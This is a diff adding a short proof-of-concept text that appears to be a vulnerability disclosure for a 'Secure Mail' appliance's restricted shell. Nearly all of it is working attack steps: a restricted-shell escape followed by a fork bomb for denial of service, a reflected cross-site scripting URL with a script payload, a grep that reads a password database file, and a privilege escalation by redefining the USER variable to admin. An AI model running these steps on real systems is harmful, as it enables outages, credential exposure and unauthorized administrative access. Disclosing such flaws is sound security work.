@@ -1,0 +1,27 @@
+
+Denial of Service:
+
+* In order to run the DoS, follow the steps below:
+[Secure Mail]: command rbash –noprofile
+[Secure Mail]: :(){:|:&};:
+
+Cross-site scripting 
+
+https://www.example.com/admin/queuedMessage.do?method=getQueueMessages&queueMsgType=<script>alert("XSS");</script>&QtnType=9
+
+Information Disclosure
+
+[Secure Mail]: command rbash –noprofile
+[Secure Mail]: grep -a '.*' /etc/pwd.db
+
+Local Privilege-Escalation: 
+
+[Secure Mail]: command rbash –noprofile
+[Secure Mail]: declare -x USER="admin"
+If you want to check the new privilege:
+[Secure Mail]: cmd_admin set user unlock
+*** Invalid command: Usage - set user unlock <USER ID> ***
+[Secure Mail]: cmd_admin set user unlock admin
+Cannot unlock yourself.
+[Secure Mail]: exi
+
